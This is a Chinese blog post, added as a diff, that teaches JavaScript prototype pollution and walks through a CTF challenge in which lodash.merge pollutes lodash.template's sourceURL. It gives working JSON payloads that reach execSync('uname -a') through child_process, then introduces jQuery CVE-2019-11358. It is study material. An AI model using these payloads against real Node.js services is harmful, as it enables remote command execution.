@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/avatar.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+  <meta name="baidu-site-verification" content="opTC8YN3Pn">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: 'GB90MXPJ1C',
+      apiKey: '05d808da3baf50ac2f2fad2dc3a3cd8f',
+      indexName: 'dev_blog',
+      hits: {"per_page":20},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="prototype和__proto__prototypeJavascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式：12345678910function Foo() &amp;#123;    this.bar = 1&amp;#125;Foo.prototype.show = function show() &amp;#123;    console.log(">
+<meta name="keywords" content="JavaScript,jQuery,原型链污染">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaScript原型链污染学习笔记">
+<meta property="og:url" content="http://anemone.top/JS-原型链污染/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="prototype和__proto__prototypeJavascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式：12345678910function Foo() &amp;#123;    this.bar = 1&amp;#125;Foo.prototype.show = function show() &amp;#123;    console.log(">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/uml.svg">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/1556024722140.png">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/1556025479492.png">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/1556109443518.png">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/1556110289896.png">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/1556111648655.png">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/1556973914607.png">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/1557061047384.png">
+<meta property="og:image" content="http://anemone.top/JS-原型链污染/1557061924872.png">
+<meta property="og:updated_time" content="2021-04-26T13:55:26.721Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JavaScript原型链污染学习笔记">
+<meta name="twitter:description" content="prototype和__proto__prototypeJavascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式：12345678910function Foo() &amp;#123;    this.bar = 1&amp;#125;Foo.prototype.show = function show() &amp;#123;    console.log(">
+<meta name="twitter:image" content="http://anemone.top/JS-原型链污染/uml.svg">
+  <link rel="canonical" href="http://anemone.top/JS-原型链污染/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>JavaScript原型链污染学习笔记 | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input" id="search-input"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+  
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/JS-原型链污染/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">JavaScript原型链污染学习笔记
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-05 21:14:20" itemprop="dateCreated datePublished" datetime="2019-05-05T21:14:20+08:00">2019-05-05</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 21:55:26" itemprop="dateModified" datetime="2021-04-26T21:55:26+08:00">2021-04-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全-JavaScript/" itemprop="url" rel="index"><span itemprop="name">Web安全-JavaScript</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/JS-原型链污染/" class="post-meta-item leancloud_visitors" data-flag-title="JavaScript原型链污染学习笔记" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a><code>prototype</code>和<code>__proto__</code></h1><h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><code>prototype</code></h2><p>Javascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+<h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h2><p><code>prototype</code>只能在类（换句话说，构造函数）上使用，如果想在实体化的类上使用则需要使用<code>__proto__</code>属性，即：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__.show == Foo.prototype.show</span><br></pre></td></tr></table></figure>
+<h1 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h1><p>子类将其prototype赋值为一个父类对象实例，表示其继承父类。对于子对象的属性，若其不存在，则会递归查找其父对象，举例说明：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Donald'</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">'Trump'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Melania'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>) <span class="comment">//输出Melania Trump</span></span><br></pre></td></tr></table></figure>
+<p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
+<ol>
+<li>在对象son中寻找last_name</li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
+<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ol>
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>考虑以下情况，如果使用<code>son.__proto__.name=&quot;son&quot;</code>，那么会造成<code>daughter.name=son</code></p>
+<p><img src="/JS-原型链污染/uml.svg" alt="uml"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// son是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> son = &#123;<span class="attr">name</span>: <span class="string">"mike"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// son.name="mike"</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改son的原型（即Object）</span></span><br><span class="line">son.__proto__.name = <span class="string">"poison"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> daughter = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看daughter.name(daughter.name="poison")</span></span><br><span class="line"><span class="built_in">console</span>.log(daughter.name)</span><br></pre></td></tr></table></figure>
+<p><code>foo.__proto__==zoo.__proto__==object</code></p>
+<h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><p>js中的merge、clone操作：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>失败的利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p>
+<p>成功的利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p>
+<p><strong>解释:</strong><br>失败利用的<code>__proto__</code>实际上是使o2的<code>__proto__</code>为<code>{b:2}</code>，即<code>o2.__proto__={b:2}</code>，这样<code>for</code>遍历时指挥遍历<code>a,b</code>，而不会遍历到<code>__proto__</code>。</p>
+<p><img src="/JS-原型链污染/1556024722140.png" alt="1556024722140"></p>
+<p>成功方法的JSON.parse会使o2的<code>__proto__</code>为一个普通的键名称，所以在<code>let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)</code>后o2的原型是没有b属性的，而在merge后会将o2的原型（object）增加一个b属性。</p>
+<p><img src="/JS-原型链污染/1556025479492.png" alt="1556025479492"></p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>参考p神出的<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js" target="_blank" rel="noopener">Code-Breaking 2018 Thejs</a> 题目：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content) <span class="comment">//source</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language,</span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>source，用户输入的body传入merge方法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lodash.merge(data, req.body)</span><br></pre></td></tr></table></figure></p>
+<p>sink为<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">lodash.template()</a>和第8行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数，举例子更好说明：</p>
+<p><img src="/JS-原型链污染/1556109443518.png" alt="1556109443518"></p>
+<p>Function.apply(object, args)可以调用该函数，可以理解为<code>object.function(arg1, arg2)，args=[arg1, arg2]</code>，例如：</p>
+<p><img src="/JS-原型链污染/1556110289896.png" alt="1556110289896"></p>
+<p>再解释一下attempt：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempt = baseRest(<span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> apply(func, <span class="literal">undefined</span>, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> isError(e) ? e : <span class="keyword">new</span> <span class="built_in">Error</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>可以看到attempt的输入参数是(func[,args])，考虑到js特性——假设function(arg1,arg2,arg3)定义的函数有三个参数，其调用时参数个数可以小于3，实际相当于<code>func.apply</code>，而真正发生调用是在第8行。</p>
+<h2 id="有缺陷的Payload"><a href="#有缺陷的Payload" class="headerlink" title="有缺陷的Payload"></a>有缺陷的Payload</h2><p>根据上面的分析，可以通过原型污染到object，使options也有sourceURL属性，构造出如下的payload：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.70.138:8086</span><br><span class="line"><span class="attribute">Content-Length</span>: 198</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.70.138:8086</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.70.138:8086/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"__proto__": &#123;"sourceURL": "\u000areturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>解释一下payload，<code>e=&gt;{return ...}</code>是ES6的匿名函数创建语法，相当于</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计<code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code>中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function</p>
+<p>执行结果如下</p>
+<p><img src="/JS-原型链污染/1556111648655.png" alt="1556111648655"></p>
+<p>注意，ping命令不能用，因为nodejs没有权限，Content-Type需要改为json（nodejs默认接受json格式）。</p>
+<h2 id="优化payload"><a href="#优化payload" class="headerlink" title="优化payload"></a>优化payload</h2><p>上面的payload已经可以攻击成功，但是存在一个弊端就是在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务：</p>
+<p><img src="/JS-原型链污染/1556973914607.png" alt="1556973914607"></p>
+<p>需要用for循环把之前的污染删掉，这也就成了p神帖子里面的payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\u000areturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>题外话，当时没想清楚为啥在return之前删除可以在后面删除污染，实际上是一个简单的先后问题，即在request的时候，我们污染了<code>sourceURL</code>，接着造成代码执行（先），在执行时，污染源被清除（后），返回系统命令执行结果，这样之后的调用就不会受到原型链污染的影响了。</p>
+<h1 id="jQuery的原型污染-CVE-2019-11358"><a href="#jQuery的原型污染-CVE-2019-11358" class="headerlink" title="jQuery的原型污染(CVE-2019-11358)"></a>jQuery的原型污染(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11358" target="_blank" rel="noopener">CVE-2019-11358</a>)</h1><p>jQuery 3.4.0以下版本（不包括3.4.0）存在原型污染漏洞。主要原因可以参考奇安信代码卫士的“<a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">jQuery CVE-2019-11358 原型污染漏洞分析和修复建议</a>”一文。</p>
+<p>Sink出现在src/core.js代码jQuery.extend函数的<a href="https://github.com/jquery/jquery/blob/3.3.1/src/core.js#L155" target="_blank" rel="noopener">180-185行</a>：</p>
+<p><img src="/JS-原型链污染/1557061047384.png" alt="1557061047384"></p>
+<p>180行是一个递归调用，这里可以看到extend()参数有deep，clone，copy三个，接着<code>target[name]=copy</code>中，如果name和copy可控的话就可以进行污染了。</p>
+<p>这两个变量当然是可控的，向上看到155-160行：</p>
+<p><img src="/JS-原型链污染/1557061924872.png" alt="1557061924872"></p>
+<p>arguments就是传进来的参数，先赋值给options，接着options的key就是name，value就是copy。</p>
+<p>因此可以构造如下PoC：</p>
